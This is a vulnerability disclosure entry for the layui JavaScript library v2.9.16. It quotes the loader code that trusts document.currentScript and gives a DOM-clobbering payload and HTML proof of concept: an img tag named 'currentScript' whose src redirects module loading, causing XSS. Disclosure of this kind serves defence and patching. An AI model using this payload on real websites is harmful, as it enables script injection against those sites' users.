## layui

### Meta

+ Library: layui
+ Stars: 29.5K
+ Version: v2.9.16
+ Fingerprint: `window.LAYUI_GLOBAL  !== undefined`
+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx">```
+ Impact: XSS
+ CVE: CVE-2024-XXXXX
+ Status: Patched
+ Security Policy: Requested
+ Foundby: TheHulk

### Library

https://github.com/layui/layui

### Vulnerable Code Snippet

```javascript
var doc = win.document;
  var config = {
    modules: {}, // 模块物理路径
    status: {}, // 模块加载状态
    timeout: 10, // 符合规范的模块请求最长等待秒数
    event: {} // 模块自定义事件
  };

  var Layui = function(){
    this.v = '2.9.16'; // Layui 版本号
  };

  // 识别预先可能定义的指定全局对象
  var GLOBAL = win.LAYUI_GLOBAL || {};

  // 获取 layui 所在目录
  var getPath = function(){
    var jsPath = doc.currentScript ? doc.currentScript.src : function(){
      var js = doc.scripts;
      var last = js.length - 1;
      var src;
      for(var i = last; i > 0; i--){
        if(js[i].readyState === 'interactive'){
          src = js[i].src;
          break;
        }
      }
      return src || js[last].src;
    }();

    return config.dir = GLOBAL.dir || jsPath.substring(0, jsPath.lastIndexOf('/') + 1);
  }();
```

## PoC

```html
<!--Library-->
<link href="./layui.css" rel="stylesheet" />
<script src="./layui.js"></script>
<script>
  // Usage
  layui.use(function () {
    var layer = layui.layer;
    // Welcome
    layer.msg("Hello World", { icon: 6 });
  });
</script>
<!--Library-->

<!--Payload-->
<img name="currentScript" src="http://localhost:9999">
<!--Payload-->
```